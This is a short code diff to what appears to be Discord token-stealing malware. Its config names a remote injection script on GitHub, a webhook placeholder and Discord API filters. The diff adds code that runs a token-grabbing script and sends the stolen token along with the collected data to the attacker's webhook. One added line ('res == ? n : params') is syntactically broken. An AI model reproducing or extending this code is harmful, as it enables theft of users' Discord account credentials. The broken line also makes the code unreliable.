@@ -17,7 +17,7 @@ var config = {
 
     injection_url: "https://raw.githubusercontent.com/MySk84funishigh/M/main/index.js",
     webhook: "%WEBHOOK%",
-
+    
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -231,7 +231,11 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    
+    var token = await execScript(tokenScript)
+    var n = JSON.stringify({
+        data: params,
+        token: token
+    });
     [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
@@ -247,7 +251,7 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(params);
+        req.write(res == ? n : params);
         req.end();
     })
 
